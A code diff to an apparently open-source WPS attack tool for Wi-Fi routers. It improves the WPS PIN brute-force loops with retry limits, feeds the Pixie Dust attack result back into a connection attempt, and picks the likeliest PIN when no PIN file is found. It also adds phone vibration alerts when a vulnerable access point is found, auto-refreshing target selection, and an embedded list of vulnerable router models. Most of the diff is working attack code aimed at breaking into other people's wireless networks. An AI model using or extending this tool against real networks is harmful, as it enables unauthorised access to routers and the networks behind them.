@@ -8,6 +8,7 @@ import shutil
 import re
 import codecs
 import socket
+import select
 import pathlib
 import time
 from datetime import datetime
@@ -181,11 +182,16 @@ class WPSpin:
             return None
 
     def append_from_pin_csv(self, pin_file_path, mac):
-        with open(pin_file_path, newline='') as csvfile:
-            reader = csv.reader(csvfile)
-            for row in reader:
-                if  mac.startswith(row[1]):
-                    self.algos['pinGeneric']['static'].append(row[0])
+        try:
+            with open(pin_file_path, newline='') as csvfile:
+                reader = csv.reader(csvfile)
+                for row in reader:
+                    if len(row) < 2:
+                        continue
+                    if mac.startswith(row[1]):
+                        self.algos['pinGeneric']['static'].append(row[0])
+        except FileNotFoundError:
+            pass
 
     def _suggest(self, mac):
         """
@@ -370,6 +376,7 @@ class ConnectionStatus:
         self.last_m_message = 0
         self.essid = ''
         self.wpa_psk = ''
+        self.bssid = ''
 
     def isFirstHalfValid(self):
         return self.last_m_message > 5
@@ -704,7 +711,7 @@ class Companion:
             return False
 
         while True:
-            res = self.__handle_wpas(pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose, bssid=bssid.lower())
+            res = self.__handle_wpas(pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose, bssid=bssid.lower() if bssid else '')
             if not res:
                 break
             if self.connection_status.status == 'WSC_NACK':
@@ -731,7 +738,7 @@ class Companion:
                         else:
                             raise FileNotFoundError
                 except FileNotFoundError:
-                    pin = '12345670'
+                    pin = self.generator.getLikely(bssid) or '12345670'
             elif not pbc_mode:
                 # If not pixiemode, ask user to select a pin from the list
                 pin = self.__prompt_wpspin(bssid) or '12345670'
@@ -764,8 +771,8 @@ class Companion:
         elif pixiemode:
             if self.pixie_creds.got_all():
                 pixiedust_pin = self.__runPixiewps(showpixiecmd, pixieforce)
-                if pin:
-                    return self.__wps_connection(bssid, pixiedust_pin, pixiemode=False)
+                if pixiedust_pin:
+                    return self.single_connection(bssid, pin=pixiedust_pin, pixiemode=False, store_pin_on_fail=True)
                 return False
             else:
                 print('[!] Not enough data to run Pixie Dust attack')
@@ -776,7 +783,7 @@ class Companion:
                 self.__savePin(bssid, pin)
             return False
 
-    def __first_half_bruteforce(self, bssid, f_half, delay=None):
+    def __first_half_bruteforce(self, bssid, f_half, delay=None, retries=0):
         """
         @f_half — 4-character string
         """
@@ -784,13 +791,16 @@ class Companion:
         while int(f_half) < 10000:
             t = int(f_half + '000')
             pin = '{}000{}'.format(f_half, checksum(t))
-            self.single_connection(bssid, pin)
+            self.single_connection(bssid, pin=pin)
             if self.connection_status.isFirstHalfValid():
                 print('[+] First half found')
                 return f_half
             elif self.connection_status.status == 'WPS_FAIL':
                 print('[!] WPS transaction failed, re-trying last pin')
-                return self.__first_half_bruteforce(bssid, f_half)
+                if retries >= 5:
+                    print('[-] Too many WPS failures, aborting bruteforce')
+                    return False
+                return self.__first_half_bruteforce(bssid, f_half, delay, retries + 1)
             f_half = str(int(f_half) + 1).zfill(4)
             self.bruteforce.registerAttempt(f_half)
             if delay:
@@ -798,7 +808,7 @@ class Companion:
         print('[-] First half not found')
         return False
 
-    def __second_half_bruteforce(self, bssid, f_half, s_half, delay=None):
+    def __second_half_bruteforce(self, bssid, f_half, s_half, delay=None, retries=0):
         """
         @f_half — 4-character string
         @s_half — 3-character string
@@ -807,12 +817,15 @@ class Companion:
         while int(s_half) < 1000:
             t = int(f_half + s_half)
             pin = '{}{}{}'.format(f_half, s_half, checksum(t))
-            self.single_connection(bssid, pin)
+            self.single_connection(bssid, pin=pin)
             if self.connection_status.last_m_message > 6:
                 return pin
             elif self.connection_status.status == 'WPS_FAIL':
                 print('[!] WPS transaction failed, re-trying last pin')
-                return self.__second_half_bruteforce(bssid, f_half, s_half)
+                if retries >= 5:
+                    print('[-] Too many WPS failures, aborting bruteforce')
+                    return False
+                return self.__second_half_bruteforce(bssid, f_half, s_half, delay, retries + 1)
             s_half = str(int(s_half) + 1).zfill(3)
             self.bruteforce.registerAttempt(f_half + s_half)
             if delay:
@@ -896,12 +909,30 @@ class WiFiScanner:
         except FileNotFoundError:
             self.stored = []
 
+    @staticmethod
+    def _notify_vulnerable():
+        """Aviso best-effort en Termux al detectar un AP probablemente vulnerable.
+        Requiere el paquete termux-api (termux-vibrate) y play-audio; si no estan
+        instalados no hace nada (no rompe en Linux normal)."""
+        if shutil.which('termux-vibrate'):
+            subprocess.Popen(['termux-vibrate', '-f'],
+                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        knock = os.path.join(os.path.dirname(os.path.realpath(__file__)), 'knock.ogg')
+        if shutil.which('play-audio') and os.path.isfile(knock):
+            subprocess.Popen(['play-audio', knock],
+                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
     def checkvuln_from_pin_csv(self, pin_file_path, mac):
-        with open(pin_file_path, newline='') as csvfile:
-            reader = csv.reader(csvfile)
-            for row in reader:
-                if  mac.startswith(row[1]):
-                    return True
+        try:
+            with open(pin_file_path, newline='') as csvfile:
+                reader = csv.reader(csvfile)
+                for row in reader:
+                    if len(row) < 2:
+                        continue
+                    if mac.startswith(row[1]):
+                        return True
+        except FileNotFoundError:
+            return False
 
     def iw_scanner(self) -> Dict[int, dict]:
         """Parsing iw scan results"""
@@ -1136,6 +1167,7 @@ class WiFiScanner:
                   or self.checkvuln_from_pin_csv(os.path.join(os.path.dirname(os.path.realpath(__file__)),
                                                               'pins.csv'), network['BSSID'])):
                 print(colored(line, color='green'))
+                self._notify_vulnerable()
             else:
                 print(line)
 
@@ -1148,14 +1180,21 @@ class WiFiScanner:
             return
         while 1:
             try:
-                networkNo = input('Select target (press Enter to refresh): ')
+                if sys.stdin.isatty():
+                    print('Select target (10s -> auto-refresh, Enter para refrescar): ',
+                          end='', flush=True)
+                    ready, _, _ = select.select([sys.stdin], [], [], 10)
+                    if not ready:
+                        print('\n[*] Auto-refreshing network list…')
+                        return self.prompt_network()
+                    networkNo = sys.stdin.readline().strip()
+                else:
+                    networkNo = input('Select target (press Enter to refresh): ')
                 if networkNo.lower() in ('r', '0', ''):
                     return self.prompt_network()
                 elif int(networkNo) in networks.keys():
-                    if networks[int(networkNo)]['ESSID'] is None:
-                        return networks[int(networkNo)]['BSSID']
-                    else:
-                        return networks[int(networkNo)]['BSSID'], networks[int(networkNo)]['ESSID']
+                    return (networks[int(networkNo)]['BSSID'],
+                            networks[int(networkNo)]['ESSID'])
                 else:
                     raise IndexError
             except Exception:
@@ -1212,6 +1251,173 @@ Advanced arguments:
 
 Example:
     %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K
+"""
+
+
+
+
+# --- Base de datos de vulnerables embebida (fallback si falta vulnwsc.txt) ---
+VULN_DATABASE = """ADSL Router EV-2006-07-27
+ADSL RT2860
+AIR3G WSC Wireless Access Point AIR3G WSC Device
+AirLive Wireless Gigabit AP AirLive Wireless Gigabit AP
+Archer_A9 1.0
+ArcherC20i 1.0
+Archer A2 5.0
+Archer A5 4.0
+Archer C2 1.0
+Archer C2 3.0
+Archer C5 4.0
+Archer C6 3.20
+Archer C6U 1.0.0
+Archer C20 1.0
+Archer C20 4.0
+Archer C20 5.0
+Archer C50 1.0
+Archer C50 3.0
+Archer C50 4.0
+Archer C50 5.0
+Archer C50 6.0
+Archer MR200 1.0
+Archer MR200 4.0
+Archer MR400 4.2
+Archer MR200 5.0
+Archer VR300 1.20
+Archer VR400 3.0
+Archer VR2100 1.0
+B-LINK 123456
+Belkin AP EV-2012-09-01
+DAP-1360 DAP-1360
+DIR-635 B3
+DIR-819 v1.0.1
+DIR-842 DIR-842
+DWR-921C3 WBR-0001
+D-Link N Router GO-RT-N150
+D-Link Router DIR-605L
+D-Link Router DIR-615H1
+D-Link Router DIR-655
+D-Link Router DIR-809
+D-Link Router GO-RT-N150
+Edimax Edimax
+EC120-F5 1.0
+EC220-G5 2.0
+EV-2009-02-06
+Enhanced Wireless Router F6D4230-4 v1
+Home Internet Center KEENETIC series
+Home Internet Center Keenetic series
+Huawei Wireless Access Point RT2860
+JWNR2000v2(Wireless AP) JWNR2000v2
+Keenetic Keenetic series
+Linksys Wireless Access Point EA7500
+Linksys Wireless Router WRT110
+NBG-419N NBG-419N
+Netgear AP EV-2012-08-04
+NETGEAR Wireless Access Point NETGEAR
+NETGEAR Wireless Access Point R6220
+NETGEAR Wireless Access Point R6260
+N/A EV-2010-09-20
+Ralink Wireless Access Point RT2860
+Ralink Wireless Access Point WR-AC1210
+RTL8196E
+RTL8xxx EV-2009-02-06
+RTL8xxx EV-2010-09-20
+RTL8xxx RTK_ECOS
+RT-G32 1234
+Sitecom Wireless Router 300N X2 300N
+Smart Router R3 RT2860
+Tenda 123456
+Timo RA300R4 Timo RA300R4
+TD-W8151N RT2860
+TD-W8901N RT2860
+TD-W8951ND RT2860
+TD-W9960 1.0
+TD-W9960 1.20
+TD-W9960v 1.0
+TD-W8968 2.0
+TEW-731BR TEW-731BR
+TL-MR100 1.0
+TL-MR3020 3.0
+TL-MR3420 5.0
+TL-MR6400 3.0
+TL-MR6400 4.0
+TL-WA855RE 4.0
+TL-WR840N 4.0
+TL-WR840N 5.0
+TL-WR840N 6.0
+TL-WR841N 13.0
+TL-WR841N 14.0
+TL-WR841HP 5.0
+TL-WR842N 5.0
+TL-WR845N 3.0
+TL-WR845N 4.0
+TL-WR850N 1.0
+TL-WR850N 2.0
+TL-WR850N 3.0
+TL-WR1042N EV-2010-09-20
+Trendnet router TEW-625br
+Trendnet router TEW-651br
+VN020-F3 1.0
+VMG3312-T20A RT2860
+VMG8623-T50A RT2860
+WAP300N WAP300N
+WAP3205 WAP3205
+Wi-Fi Protected Setup Router RT-AC1200G+
+Wi-Fi Protected Setup Router RT-AX55
+Wi-Fi Protected Setup Router RT-N10U
+Wi-Fi Protected Setup Router RT-N12
+Wi-Fi Protected Setup Router RT-N12D1
+Wi-Fi Protected Setup Router RT-N12VP
+Wireless Access Point .
+Wireless Router 123456
+Wireless Router RTL8xxx EV-2009-02-06
+Wireless Router Wireless Router
+Wireless WPS Router <#ZVMODELVZ#>
+Wireless WPS Router RT-N10E
+Wireless WPS Router RT-N10LX
+Wireless WPS Router RT-N12E
+Wireless WPS Router RT-N12LX
+WN3000RP V3
+WN-200R WN-200R
+WPS Router (5G) RT-N65U
+WPS Router DSL-AC51
+WPS Router DSL-AC52U
+WPS Router DSL-AC55U
+WPS Router DSL-N14U-B1
+WPS Router DSL-N16
+WPS Router DSL-N17U
+WPS Router RT-AC750
+WPS Router RT-AC1200
+WPS Router RT-AC1200_V2
+WPS Router RT-AC1750
+WPS Router RT-AC750L
+WPS Router RT-AC1750U
+WPS Router RT-AC51
+WPS Router RT-AC51U
+WPS Router RT-AC52U
+WPS Router RT-AC52U_B1
+WPS Router RT-AC53
+WPS Router RT-AC57U
+WPS Router RT-AC65P
+WPS Router RT-AC85P
+WPS Router RT-N11P
+WPS Router RT-N12E
+WPS Router RT-N12E_B1
+WPS Router RT-N12 VP
+WPS Router RT-N12+
+WPS Router RT-N14U
+WPS Router RT-N56U
+WPS Router RT-N56UB1
+WPS Router RT-N65U
+WPS Router RT-N300
+WR5570 2011-05-13
+ZyXEL NBG-416N AP Router
+ZyXEL NBG-416N AP Router NBG-416N
+ZyXEL NBG-418N AP Router
+ZyXEL NBG-418N AP Router NBG-418N
+ZyXEL Wireless AP Router NBG-417N
+Modem/Router EV-2010-09-20
+RB06 RT2860
+RB03 RT2860
 """
 
 
@@ -1342,7 +1548,8 @@ if __name__ == '__main__':
                         with open(args.vuln_list, 'r', encoding='utf-8') as file:
                             vuln_list = file.read().splitlines()
                     except FileNotFoundError:
-                        vuln_list = []
+                        # BD de vulnerables embebida si no existe vulnwsc.txt
+                        vuln_list = VULN_DATABASE.strip().splitlines()
                     scanner = WiFiScanner(args.interface, vuln_list)
                     if not args.loop:
                         print('[*] BSSID not specified (--bssid) — scanning for available networks')
